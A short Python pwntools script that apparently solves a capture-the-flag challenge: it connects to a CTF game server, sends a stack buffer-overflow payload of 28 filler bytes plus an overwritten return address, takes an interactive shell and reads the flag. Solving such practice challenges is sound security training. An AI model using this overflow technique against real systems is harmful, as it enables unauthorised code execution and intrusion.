from pwn import *

# The port changed each time an instance of the chall was run
conn = remote("challenge.ctf.games", 12345)
conn.recvuntil("!")
conn.sendline(b"A"*28 + p32(0x080491f5))
conn.interactive()

# Then print the flag with 'cat flag'
